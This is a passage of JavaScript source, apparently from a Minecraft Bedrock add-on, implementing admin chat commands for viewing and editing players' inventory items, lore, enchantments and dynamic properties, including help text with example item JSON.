                                        slotsArray = slotsArray.concat(String("slot: " + i + ", item: " + inventoryd.container.getItem(Number(i)).typeId + ", amount: " + inventoryd.container.getItem(Number(i)).amount + ", nameTag: " + inventoryd.container.getItem(Number(i)).nameTag + "§r§f, lore: " + (JSONStringify(inventoryd.container.getItem(Number(i)).getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!inventoryd.container.getItem(Number(i))?.getComponent("enchantable")) ? JSON.stringify(inventoryd.container.getItem(Number(i))?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]" : "N/A")));
                                    }
                                    else {
                                        slotsArray = slotsArray.concat("slot: " + i + ", item: minecraft:air");
                                    }
                                }
                                ;
                            }
                            catch { }
                        }
                        if (!!equipmentd2) {
                            for (let i = 0; i < 6; i++) {
                                try {
                                    let item = equipmentd2.getEquipment([EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i]);
                                    if (item !== undefined) {
                                        slotsArray = slotsArray.concat(String("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: " + item.typeId + ", amount: " + item.amount + ", nameTag: " + item.nameTag + "§r§f, lore: " + (JSONStringify(item.getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!item?.getComponent("enchantable")) ? JSON.stringify(item?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]" : "N/A")));
                                    }
                                    else {
                                        slotsArray = slotsArray.concat("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: minecraft:air");
                                    }
                                }
                                catch { }
                            }
                            ;
                        }
                        eventData.sender.sendMessage(String(world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders.id == switchTestB.slice(7).split(" ")[0])).nameTag + "'s Items: \n" + slotsArray.join("§r§f\n")));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                });
                break;
            case !!switchTest.match(/^setitem$/):
                eventData.cancel = true;
                switch (true) {
                    case (newMessage.split(" ").length >= 5):
                        {
                            let playerTotalVictimsList;
                            targetSelectorAllListB(newMessage.split(" ").slice(4).join(" "), "", Number(player.id)).forEach((player2) => {
                                playerTotalVictimsList.push(player2.name);
                                const inventoryc = player2.getComponent("inventory");
                                system.run(() => { try {
                                    inventoryc.container.setItem(Number(newMessage.slice(9).split(" ")[2]), new ItemStack(newMessage.slice(9).split(" ")[0], Number(newMessage.slice(9).split(" ")[1])));
                                    eventData.sender.sendMessage(String("Set Slot " + newMessage.slice(9).split(" ")[2] + " of " + player2.name + "\'s inventory to " + newMessage.slice(9).split(" ")[0] + " * " + newMessage.slice(9).split(" ")[1]));
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                            });
                            system.run(() => { targetSelectorAllListC("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", "", "~~~", player).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set Slot §c" + newMessage.slice(9).split(" ")[2] + "§r§f of §n[§f" + playerTotalVictimsList + "§r§u]§f inventories to §u" + newMessage.slice(9).split(" ")[0] + "§r§f * §c" + newMessage.slice(9).split(" ")[1])); }); });
                        }
                        break;
                    case (newMessage.split(" ").length <= 4):
                        {
                            const inventoryc = player.getComponent("inventory");
                            system.run(() => { try {
                                inventoryc.container.setItem(Number(newMessage.slice(9).split(" ")[2]), new ItemStack(newMessage.slice(9).split(" ")[0], Number(newMessage.slice(9).split(" ")[1])));
                                eventData.sender.sendMessage(String("Set Slot " + newMessage.slice(9).split(" ")[2] + " of " + player.name + "\'s inventory to " + newMessage.slice(9).split(" ")[0] + " * " + newMessage.slice(9).split(" ")[1]));
                                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set Slot " + newMessage.slice(9).split(" ")[2] + " of " + player.name + "\'s inventory to " + newMessage.slice(9).split(" ")[0] + " * " + newMessage.slice(9).split(" ")[1])); }); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            } });
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^setitemb$/):
                eventData.cancel = true;
                if (switchTestB.trim().split(" ").length == 1) {
                    player.sendMessage(`setitemb custom command format: ${command.dp}setitemb <itemJSON: itemJSON> <slot: int>
simplified itemJSON format (type "${String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")}help itemJSONFormat" to see full format options): 
{
    "name"?: string,
    "lore"?: string[],
    "count"?: number,
    "keepondeath"?: boolean,
    "lockmode"?: ItemLockMode,
    "canplaceon"?: string[],
    "components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "clear"?: any
        },
        "durability"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        }
    },
    force?: boolean
    source?: {
        type?: string,
        targetSelector?: string,
        targetSelectorExecutionLocation?: DimensionLocation,
        targetSelectorSourceEntity?: Entity,
        player?: string,
        entityAtBlock?: DimensionLocation,
        entityType?: string,
        entityTypeId?: string,
        entityId?: string|number,
        block?: DimensionLocation,
        slot?: number,
        id?: string,
        itemId?: string,
        count?: number,
        amount?: number
    },
    type?: string,
    dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    cleardynamicproperties?: any,
    removedynamicproperties?: string[],
    removedynamicproperty?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`);
                }
                else {
                    let argsa = evaluateParameters(switchTestB, ["presetText", "json", "presetText"]);
                    let args = argsa.args;
                    if ((args[3] ?? "").trim() == "~") {
                        args[3] = player.name;
                    }
                    if (!!!(args[1].type ?? args[1].typeId ?? args[1].id ?? args[1].itemType)) {
                        player.sendMessage("§cError: Item type not specified in JSON. ");
                    }
                    else {
                        try {
                            let item = itemJSONPropertiesEval(args[1]);
                            switch (true) {
                                case (argsa.extra.trim() != ""):
                                    {
                                        let playerTotalVictimsList;
                                        targetSelectorAllListB(argsa.extra, "", Number(player.id)).forEach((player2) => {
                                            playerTotalVictimsList.push(player2.name);
                                            const inventoryc = player2.getComponent("inventory");
                                            system.run(() => { try {
                                                inventoryc.container.setItem(((args[2] ?? "").trim() == "~" || (args[2] ?? "").trim() == "") ? player.selectedSlot : Number(args[2]), item);
                                                eventData.sender.sendMessage(String("Set Slot " + ((args[2] ?? "").trim() == "~" || (args[2] ?? "").trim() == "") ? player.selectedSlot : args[2] + " of " + player2.name + "\'s inventory to " + item.typeId + " * " + item.amount));
                                            }
                                            catch (e) {
                                                eventData.sender.sendMessage("§c" + e + e.stack);
                                            } });
                                        });
                                        system.run(() => { targetSelectorAllListC("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", "", "~~~", player).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set Slot §c" + args[2] + "§r§f of §n[§f" + playerTotalVictimsList + "§r§u]§f inventories to §u" + item.typeId + "§r§f * §c" + item.amount)); }); });
                                    }
                                    break;
                                case (argsa.extra.trim() == ""):
                                    {
                                        const inventoryc = player.getComponent("inventory");
                                        system.run(() => { try {
                                            inventoryc.container.setItem(((args[2] ?? "").trim() == "~" || (args[2] ?? "").trim() == "") ? player.selectedSlot : Number(args[2]), item);
                                            eventData.sender.sendMessage(String("Set Slot " + args[2] + " of " + player.name + "\'s inventory to " + item.typeId + " * " + item.amount));
                                            world.getAllPlayers().filter(v => v.hasTag("canSeeCustomChatCommandFeedbackFromMods")).forEach((playerb) => { playerb.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set Slot " + args[2] + " of " + player.name + "\'s inventory to " + item.typeId + " * " + item.amount)); });
                                        }
                                        catch (e) {
                                            eventData.sender.sendMessage("§c" + e + e.stack);
                                        } });
                                    }
                                    break;
                            }
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                    }
                }
                break;
            case !!switchTest.match(/^item$/):
                eventData.cancel = true;
                if (switchTestB.trim().split(" ").length == 1) {
                    player.sendMessage(`item command format: 
${command.dp}item <mode: lore|lorene> <lore: JSON>
${command.dp}item <mode: canplaceon|candestroy> <blockTypes: string[]>
${command.dp}item name <name: text>
${command.dp}item count <count: int(1-255)>
${command.dp}item <mode: json|jsonb> <itemJSON: ItemJSON>
${command.dp}item property removelist <propertyIdList: string[]>
${command.dp}item property setlist <propertyList: JSON>
${command.dp}item property <mode: remove|get> <propertyId: string>
${command.dp}item property setnumber <propertyId: string> <propertyValue: number>
${command.dp}item property setstring <propertyId: string> <propertyValue: string>
${command.dp}item property setboolean <propertyId: string> <propertyValue: boolean>
${command.dp}item property setvector3 <propertyId: string> <propertyValue: Vector3>
${command.dp}item property <mode: list|clear>
${command.dp}item enchantment add <enchantment: {"level": number, "type": string}>
${command.dp}item enchantment addlist <enchantment: {"level": number, "type": string}[]>
${command.dp}item enchantment <mode: remove|get|testfor> <enchantmentId: string>
${command.dp}item enchantment <mode: list|clear>
${command.dp}item slot <slot: int> <mode: lore|lorene> <lore: JSON>
${command.dp}item slot <slot: int> name <name: text>
${command.dp}item slot <slot: int> count <count: int(1-255)>
${command.dp}item slot <slot: int> <mode: json|jsonb> <itemJSON: ItemJSON>
${command.dp}item slot <slot: int> property removelist <propertyIdList: string[]>
${command.dp}item slot <slot: int> property setlist <propertyList: JSON>
${command.dp}item slot <slot: int> property <mode: remove|get> <propertyId: string>
${command.dp}item slot <slot: int> property setnumber <propertyId: string> <propertyValue: number>
${command.dp}item slot <slot: int> property setstring <propertyId: string> <propertyValue: string>
${command.dp}item slot <slot: int> property setboolean <propertyId: string> <propertyValue: boolean>
${command.dp}item slot <slot: int> property setvector3 <propertyId: string> <propertyValue: Vector3>
${command.dp}item slot <slot: int> property <mode: list|clear>
${command.dp}item slot <slot: int> enchantment add <enchantment: {"level": number, "type": string}>
${command.dp}item slot <slot: int> enchantment addlist <enchantment: {"level": number, "type": string}[]>
${command.dp}item slot <slot: int> enchantment <mode: remove|get|testfor> <enchantmentId: string>
${command.dp}item slot <slot: int> enchantment <mode: list|clear>`);
                }
                else {
                    let argsa = evaluateParameters(switchTestB, ["presetText", "presetText"]);
                    try {
                        let command = newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length);
                        switch (command.split(" ").slice(0, 2).join(" ")) {
                            case "item lore":
                                let lore = JSON.parse(command.split(" ").slice(2).join(" "));
                                let errs;
                                errs = [];
                                lore.forEach((l, i) => { let calc = l.escapeCharactersB(true); lore[i] = calc.v; errs.concat(calc.e); });
                                if (errs != undefined) {
                                    errs.forEach((e) => { player.sendMessage(String("§c" + e + e.stack)); });
                                }
                                ;
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).setLore(lore);
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item lorene":
                                let lorene = JSON.parse(command.split(" ").slice(2).join(" "));
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).setLore(lorene);
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item canpalceon":
                                let canpalceon = JSONParse(command.split(" ").slice(2).join(" "));
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).setCanPlaceOn(canpalceon);
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item candestroy":
                                let candestroy = JSONParse(command.split(" ").slice(2).join(" "));
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).setCanDestroy(candestroy);
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item name":
                                let name = argsa.extra.escapeCharactersB(true);
                                if (name.e != undefined) {
                                    name.e.forEach((e) => { player.sendMessage(String("§c" + e + e.stack)); });
                                }
                                ;
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).nameTag = name.v;
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item json":
                                let json = evaluateParameters(argsa.extra.trim(), ["json"]).args[0];
                                system.run(() => { try {
                                    getPlayerSelectedSlot(player).setItem(itemJSONPropertiesEval(json, player.getComponent("inventory").container.getItem(player.selectedSlot), player));
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item jsonb":
                                let jsonb = evaluateParameters(argsa.extra.trim(), ["json"]).args[0];
                                system.run(() => { try {
                                    itemJSONPropertiesEvalCT(jsonb, getPlayerSelectedSlot(player), player);
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item property":
                                switch (command.split(" ")[2]) {
                                    case "removelist":
                                        evaluateParametersOld(["json"], command.split(" ").slice(3).join(" ")).args[0].forEach(v => player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(v));
                                        break;
                                    case "setlist":
                                        Object.entries(evaluateParametersOld(["json"], command.split(" ").slice(3).join(" ")).args[0]).forEach(v => player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(v[0], v[1]));
                                        break;
                                    case "remove":
                                        player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string"], command.split(" ").slice(3).join(" ")).args[0]);
                                        break;
                                    case "setnumber":
                                        player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "number"], command.split(" ").slice(3).join(" ")).args[0], evaluateParametersOld(["string", "number"], command.split(" ").slice(3).join(" ")).args[1]);
                                        break;
                                    case "setstring":
                                        player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "string"], command.split(" ").slice(3).join(" ")).args[0], evaluateParametersOld(["string", "string"], command.split(" ").slice(3).join(" ")).args[1]);
                                        break;
                                    case "setboolean":
                                        player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "boolean"], command.split(" ").slice(3).join(" ")).args[0], evaluateParametersOld(["string", "boolean"], command.split(" ").slice(3).join(" ")).args[1]);
                                        break;
                                    case "setvector3":
                                        player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "json"], command.split(" ").slice(3).join(" ")).args[0], evaluateParametersOld(["string", "json"], command.split(" ").slice(3).join(" ")).args[1]);
                                        break;
                                    case "list":
                                        eventData.sender.sendMessage(player.getComponent("inventory").container.getItem(player.selectedSlot).getDynamicPropertyIds().join("§r§f\n"));
                                        break;
                                    case "get":
                                        eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(player.selectedSlot).getDynamicProperty(evaluateParametersOld(["string"], command.split(" ").slice(3).join(" ")).args[0])));
                                        break;
                                    case "clear":
                                        player.getComponent("inventory").container.getItem(player.selectedSlot).clearDynamicProperties();
                                        break;
                                    default:
                                        eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + command.split(" ").slice(2).join(" ") + "\": at \"\\item " + command.split(" ").slice(1, 2).join(" ") + " >>" + command.split(" ").slice(2).join(" ") + "<<\"");
                                }
                                break;
                            case "item enchantment":
                                switch (command.split(" ")[2]) {
                                    case "add":
                                        let enchantment = JSON.parse(command.split(" ").slice(3).join(" "));
                                        let itemd = player.getComponent("inventory").container.getItem(player.selectedSlot).clone();
                                        system.run(() => {
                                            try {
                                                itemd.getComponent("enchantable").addEnchantment(enchantment);
                                                player.getComponent("inventory").container.setItem(player.selectedSlot, itemd);
                                            }
                                            catch (e) {
                                                console.error(e, e.stack);
                                                player.sendMessage("§c" + e + e.stack);
                                            }
                                        });
                                        break;
                                    case "addlist":
                                        let enchantmentlist = JSON.parse(command.split(" ").slice(3).join(" "));
                                        let itema = player.getComponent("inventory").container.getItem(player.selectedSlot).clone();
                                        system.run(() => {
                                            try {
                                                itema.getComponent("enchantable").addEnchantments(enchantmentlist);
                                                player.getComponent("inventory").container.setItem(player.selectedSlot, itema);
                                            }
                                            catch (e) {
                                                console.error(e, e.stack);
                                                player.sendMessage("§c" + e + e.stack);
                                            }
                                        });
                                        break;
                                    case "remove":
                                        let itemb = player.getComponent("inventory").container.getItem(player.selectedSlot).clone();
                                        system.run(() => {
                                            try {
                                                itemb.getComponent("enchantable").removeEnchantment(command.split(" ")[3]);
                                                player.getComponent("inventory").container.setItem(player.selectedSlot, itemb);
                                            }
                                            catch (e) {
                                                console.error(e, e.stack);
                                                player.sendMessage("§c" + e + e.stack);
                                            }
                                        });
                                        break;
                                    case "set":
                                        eventData.sender.sendMessage("§l§cComing Soon!§r§f");
                                        break;
                                    case "list":
                                        eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(player.selectedSlot).getComponent("enchantable").getEnchantments()));
                                        break;
                                    case "get":
                                        eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(player.selectedSlot).getComponent("enchantable").getEnchantment(command.split(" ")[3])));
                                        break;
                                    case "clear":
                                        const itemc = player.getComponent("inventory").container.getItem(player.selectedSlot).clone();
                                        system.run(() => {
                                            try {
                                                itemc.getComponent("enchantable").removeAllEnchantments();
                                                player.getComponent("inventory").container.setItem(player.selectedSlot, itemc);
                                            }
                                            catch (e) {
                                                console.error(e, e.stack);
                                                player.sendMessage("§c" + e + e.stack);
                                            }
                                        });
                                        break;
                                    case "testfor":
                                        eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(player.selectedSlot).getComponent("enchantable").hasEnchantment(command.split(" ")[3])));
                                        break;
                                    default:
                                        eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + command.split(" ").slice(2).join(" ") + "\": at \"\\item " + command.split(" ").slice(1, 2).join(" ") + " >>" + command.split(" ").slice(2).join(" ") + "<<\"");
                                        break;
                                }
                                break;
                            case "item slot":
                                let argsb = evaluateParameters(argsa.extra.trim(), ["presetText", "presetText"]);
                                switch (command.split(" ")[3]) {
                                    case "lore":
                                        let lore = JSON.parse(command.split(" ").slice(4).join(" "));
                                        let errs;
                                        errs = [];
                                        lore.forEach((l, i) => { let calc = l.escapeCharactersB(true); lore[i] = calc.v; errs.concat(calc.e); });
                                        if (errs != undefined) {
                                            errs.forEach((e) => { player.sendMessage(String("§c" + e + e.stack)); });
                                        }
                                        ;
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).setLore(lore);
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "lorene":
                                        let lorene = JSON.parse(command.split(" ").slice(4).join(" "));
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).setLore(lorene);
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "canpalceon":
                                        let canpalceon = JSONParse(command.split(" ").slice(4).join(" "));
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).setCanPlaceOn(canpalceon);
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "candestroy":
                                        let candestroy = JSONParse(command.split(" ").slice(4).join(" "));
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).setCanDestroy(candestroy);
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "name":
                                        let name = command.split(" ").slice(4).join(" ").escapeCharactersB(true);
                                        if (name.e != undefined) {
                                            name.e.forEach((e) => { player.sendMessage(String("§c" + e + e.stack)); });
                                        }
                                        ;
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).nameTag = name.v;
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "components":
                                        eventData.sender.sendMessage("§l§cComing Soon!§r§f");
                                        break;
                                    case "amount":
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).amount = Number(command.split(" ").slice(4).join(" "));
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "count":
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).amount = Number(command.split(" ").slice(4).join(" "));
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "nameTag":
                                        let nameb = command.split(" ").slice(4).join(" ").escapeCharactersB(true);
                                        if (nameb.e != undefined) {
                                            nameb.e.forEach((e) => { player.sendMessage(String("§c" + e + e.stack)); });
                                        }
                                        ;
                                        system.run(() => { try {
                                            player.getComponent("inventory").container.getSlot(Number(command.split(" ")[2])).nameTag = nameb.v;
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "enchantment":
                                        switch (command.split(" ")[4]) {
                                            case "add":
                                                let enchantment = JSON.parse(command.split(" ").slice(5).join(" "));
                                                let itemd = player.getComponent("inventory").container.getItem(Number(command.split(" ")[2])).clone();
                                                system.run(() => {
                                                    try {
                                                        itemd.getComponent("enchantable").addEnchantment(enchantment);
                                                        player.getComponent("inventory").container.setItem(Number(command.split(" ")[2]), itemd);
                                                    }
                                                    catch (e) {
                                                        console.error(e, e.stack);
                                                        player.sendMessage("§c" + e + e.stack);
                                                    }
                                                });
                                                break;
                                            case "addlist":
                                                let enchantmentlist = JSON.parse(command.split(" ").slice(5).join(" "));
                                                let itema = player.getComponent("inventory").container.getItem(Number(command.split(" ")[2])).clone();
                                                system.run(() => {
                                                    try {
                                                        itema.getComponent("enchantable").addEnchantments(enchantmentlist);
                                                        player.getComponent("inventory").container.setItem(Number(command.split(" ")[2]), itema);
                                                    }
                                                    catch (e) {
                                                        console.error(e, e.stack);
                                                        player.sendMessage("§c" + e + e.stack);
                                                    }
                                                });
                                                break;
                                            case "remove":
                                                let itemb = player.getComponent("inventory").container.getItem(player.selectedSlot).clone();
                                                system.run(() => {
                                                    try {
                                                        itemb.getComponent("enchantable").removeEnchantment(command.split(" ")[5]);
                                                        player.getComponent("inventory").container.setItem(Number(command.split(" ")[2]), itemb);
                                                    }
                                                    catch (e) {
                                                        console.error(e, e.stack);
                                                        player.sendMessage("§c" + e + e.stack);
                                                    }
                                                });
                                                break;
                                            case "set":
                                                eventData.sender.sendMessage("§l§cComing Soon!§r§f");
                                                break;
                                            case "list":
                                                eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(Number(command.split(" ")[2])).getComponent("enchantable").getEnchantments()));
                                                break;
                                            case "get":
                                                eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(Number(command.split(" ")[2])).getComponent("enchantable").getEnchantment(command.split(" ")[5])));
                                                break;
                                            case "clear":
                                                const itemc = player.getComponent("inventory").container.getItem(Number(command.split(" ")[2])).clone();
                                                system.run(() => {
                                                    try {
                                                        itemc.getComponent("enchantable").removeAllEnchantments();
                                                        player.getComponent("inventory").container.setItem(Number(command.split(" ")[2]), itemc);
                                                    }
                                                    catch (e) {
                                                        console.error(e, e.stack);
                                                        player.sendMessage("§c" + e + e.stack);
                                                    }
                                                });
                                                break;
                                            case "test":
                                                eventData.sender.sendMessage("§l§cComing Soon!§r§f");
                                                break;
                                            default:
                                                eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + command.split(" ").slice(4).join(" ") + "\": at \"\\item " + command.split(" ").slice(1, 4).join(" ") + " >>" + command.split(" ").slice(4).join(" ") + "<<\"");
                                                break;
                                        }
                                        break;
                                    case "json":
                                        let json = evaluateParameters(argsb.extra.trim(), ["json"]).args[0];
                                        system.run(() => { try {
                                            getInventory(player).container.setItem(Number(argsb.args[0].replaceAll("~", String(player.selectedSlot))), itemJSONPropertiesEval(json, getInventory(player).container.getItem(Number(argsb.args[0].replaceAll("~", String(player.selectedSlot)))), player));
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "jsonb":
                                        let jsonb = evaluateParameters(argsb.extra.trim(), ["json"]).args[0];
                                        system.run(() => { try {
                                            itemJSONPropertiesEvalCT(jsonb, getInventory(player).container.getSlot(Number(argsb.args[0].replaceAll("~", String(player.selectedSlot)))), player);
                                        }
                                        catch (e) {
                                            console.error(e, e.stack);
                                            player.sendMessage("§c" + e + e.stack);
                                        } });
                                        break;
                                    case "property":
                                        switch (command.split(" ")[4]) {
                                            case "removelist":
                                                evaluateParametersOld(["json"], command.split(" ").slice(5).join(" ")).args[0].forEach(v => player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(v));
                                                break;
                                            case "setlist":
                                                Object.entries(evaluateParametersOld(["json"], command.split(" ").slice(5).join(" ")).args[0]).forEach(v => player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(v[0], v[1]));
                                                break;
                                            case "remove":
                                                player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string"], command.split(" ").slice(5).join(" ")).args[0]);
                                                break;
                                            case "setnumber":
                                                player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "number"], command.split(" ").slice(5).join(" ")).args[0], evaluateParametersOld(["string", "number"], command.split(" ").slice(5).join(" ")).args[1]);
                                                break;
                                            case "setstring":
                                                player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "string"], command.split(" ").slice(5).join(" ")).args[0], evaluateParametersOld(["string", "string"], command.split(" ").slice(5).join(" ")).args[1]);
                                                break;
                                            case "setboolean":
                                                player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "boolean"], command.split(" ").slice(5).join(" ")).args[0], evaluateParametersOld(["string", "boolean"], command.split(" ").slice(5).join(" ")).args[1]);
                                                break;
                                            case "setvector3":
                                                player.getComponent("inventory").container.getItem(player.selectedSlot).setDynamicProperty(evaluateParametersOld(["string", "json"], command.split(" ").slice(5).join(" ")).args[0], evaluateParametersOld(["string", "json"], command.split(" ").slice(5).join(" ")).args[1]);
                                                break;
                                            case "list":
                                                eventData.sender.sendMessage(player.getComponent("inventory").container.getItem(player.selectedSlot).getDynamicPropertyIds().join("§r§f\n"));
                                                break;
                                            case "get":
                                                eventData.sender.sendMessage(JSON.stringify(player.getComponent("inventory").container.getItem(player.selectedSlot).getDynamicProperty(evaluateParametersOld(["string"], command.split(" ").slice(5).join(" ")).args[0])));
                                                break;
                                            case "clear":
                                                player.getComponent("inventory").container.getItem(player.selectedSlot).clearDynamicProperties();
                                                break;
                                            default:
                                                eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + command.split(" ").slice(2).join(" ") + "\": at \"\\item " + command.split(" ").slice(1, 2).join(" ") + " >>" + command.split(" ").slice(2).join(" ") + "<<\"");
                                                break;
                                        }
                                        break;
                                    default:
                                        eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + command.split(" ")[3] + "\": at \"\\item " + command.split(" ").slice(1, 3).join(" ") + " >>" + command.split(" ").slice(3).join(" ") + "<<\"");
                                        break;
                                }
                                break;
                            case "item components":
                                eventData.sender.sendMessage("§l§cComing Soon!§r§f");
                                break;
                            case "item amount":
                                system.run(() => { try {
